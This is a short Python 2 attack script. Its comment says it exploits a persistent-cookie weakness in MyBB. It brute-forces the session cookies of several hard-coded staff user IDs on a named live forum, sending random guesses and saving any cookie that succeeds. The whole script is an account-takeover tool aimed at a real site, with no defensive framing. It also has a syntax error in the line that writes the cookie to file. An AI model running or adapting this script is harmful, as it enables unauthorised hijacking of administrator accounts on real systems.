#!/usr/bin/python
#This script takes advantage of a persistent cookie vulnerability existent in mybb, and tries to brute force the staff cookies.

import urllib2, random, sys, time

chars = ['a','A','b','B','c','C','d','D','e','E','f','F','g','G','h','H','i','I','j','J','k','K','l','L','m','M','n','N','o','O','p','P','q','Q','r','R','s','S','t','T','u','U','v','V','w','W','x','X','y','Y','z','Z','1','2','3','4','5','6','7','8','9']
current = []
howmany = 1
hfCookie = open('hfcookie', 'w')
users = [1,103669,4066,65784,129812,656453]
used = []

def randomgen():
    global howmany
    current = []
    for i in range(1,51):
        current.append(chars[random.randint(1, len(chars)-1)])
    try:
        current = ''.join(current)
    except:
        current = int(''.join(str(i) for i in current))
        
    if current in used:
        randomgen()
        
    used.append(current)
    request(current, howmany)
    howmany = howmany + 1

def request(cookieGuess, howmany):
    okayGo = ''
    for i in users:
        req = urllib2.Request('http://www.hackforums.net/index.php')
        req.add_header('User-Agent', 'Mozilla/5.0')
        req.add_header('Cookie', 'mybbuser=' + str(i) + '_' + cookieGuess)
        print str(howmany) + ': ' + str(i) + '_' + str(cookieGuess) + ' - ' + str(len(cookieGuess))
        try:
            okayGo = urllib2.urlopen(req).read()
        except:
            request(cookieGuess, howmany)
        if 'Welcome back, ' in okayGo:
            print 'Success!'
            print 'Cookie=' + str(i) + '_' + str(cookieGuess)
            hfCookie.write('mybbuser=' + str(i) + '_' + str(cookieGuess)
            sys.exit()
        time.sleep(1)


while 1:
    randomgen()
